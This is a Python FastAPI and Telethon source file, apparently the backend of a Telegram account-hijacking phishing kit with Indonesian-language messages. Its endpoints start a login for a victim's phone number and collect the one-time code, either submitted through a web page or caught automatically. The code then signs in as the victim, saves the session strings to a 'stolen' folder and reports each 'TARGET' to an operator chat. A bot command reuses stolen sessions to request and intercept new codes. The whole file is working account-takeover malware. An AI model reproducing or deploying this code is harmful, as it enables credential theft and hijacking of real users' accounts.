from fastapi import FastAPI, Request
from telethon import TelegramClient, events
from telethon.sessions import StringSession
import asyncio
import os
import re

app = FastAPI()

API_ID = int(os.getenv('API_ID'))
API_HASH = os.getenv('API_HASH')
BOT_TOKEN = os.getenv('BOT_TOKEN')
CHAT_ID = int(os.getenv('CHAT_ID'))

client = TelegramClient('jinx', API_ID, API_HASH)
listening = {}
OTP_PATTERN = re.compile(r'\b(\d{5})\b')

@app.post("/start_listener")
async def start_listener(req: Request):
    data = await req.json()
    phone = data['phone']

    temp = TelegramClient(StringSession(), API_ID, API_HASH)
    await temp.connect()
    sent = await temp.send_code_request(phone)
    listening[phone] = {'client': temp, 'hash': sent.phone_code_hash}

    @temp.on(events.NewMessage(incoming=True))
    async def handler(event):
        if OTP_PATTERN.search(event.message.message):
            code = OTP_PATTERN.search(event.message.message).group(1)
            await auto_login(phone, code, source="interceptor")

    await client.send_message(CHAT_ID, f"TARGET: `{phone}`\nMenunggu OTP...")
    return {"success": True}

@app.post("/submit_otp")
async def submit_otp(req: Request):
    data = await req.json()
    phone = data['phone']
    otp = data['otp']
    if phone in listening:
        await auto_login(phone, otp, source="web")
    return {"success": True}

async def auto_login(phone, code, source="unknown"):
    if phone not in listening: return
    temp = listening[phone]['client']
    hash_ = listening[phone]['hash']

    try:
        await temp.sign_in(phone, code, phone_code_hash=hash_)
        me = await temp.get_me()
        session_str = temp.session.save()

        os.makedirs("stolen", exist_ok=True)
        with open(f"stolen/{phone.replace('+','')}.session", "w") as f:
            f.write(session_str)

        msg = f"""
OTP DITERIMA: `{code}` ({source.upper()})
SESSION DICURI!
User: {me.first_name}
Phone: `{phone}`
/login {phone}
        """.strip()
        await client.send_message(CHAT_ID, msg)
        del listening[phone]
    except Exception as e:
        await client.send_message(CHAT_ID, f"Gagal: {str(e)}")

@client.on(events.NewMessage(pattern=r'/new_otp (\+\d+)'))
async def new_otp(event):
    phone = event.pattern_match.group(1)
    session_file = f"stolen/{phone.replace('+','')}.session"
    if not os.path.exists(session_file):
        await event.reply("Session nggak ada!")
        return
    
    session_str = open(session_file).read()
    stolen = TelegramClient(StringSession(session_str), API_ID, API_HASH)
    await stolen.connect()
    await stolen.start()
    
    try:
        result = await stolen.send_code_request(phone)
        await event.reply(f"OTP BARU DIKIRIM KE `{phone}`")
        
        listening[phone] = {'client': stolen, 'hash': result.phone_code_hash}
        @stolen.on(events.NewMessage(incoming=True))
        async def handler(e):
            match = OTP_PATTERN.search(e.message.message)
            if match:
                code = match.group(1)
                await event.reply(f"OTP BARU: `{code}`")
    except Exception as e:
        await event.reply(f"Gagal: {str(e)}")

@app.on_event("startup")
async def startup():
    await client.start(bot_token=BOT_TOKEN)
    print("JINX OTP BOT HIDUP!")
